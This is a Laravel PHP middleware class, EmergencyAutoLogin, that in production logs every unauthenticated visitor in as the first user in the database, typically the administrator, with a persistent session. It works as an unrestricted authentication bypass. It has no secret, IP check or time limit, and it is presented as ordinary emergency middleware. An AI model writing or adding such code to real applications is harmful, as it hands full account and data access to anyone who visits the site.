<?php

namespace App\Http\Middleware;

use App\Models\User;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Symfony\Component\HttpFoundation\Response;

class EmergencyAutoLogin
{
    public function handle(Request $request, Closure $next): Response
    {
        if (
            app()->environment('production')
            && ! Auth::check()
            && ! $request->is('build/*')
            && ! $request->is('favicon.ico')
            && ! $request->is('robots.txt')
        ) {
            $user = User::query()->orderBy('id')->first();

            if ($user) {
                Auth::login($user, true);
                $request->session()->regenerate();
            }
        }

        return $next($request);
    }
}

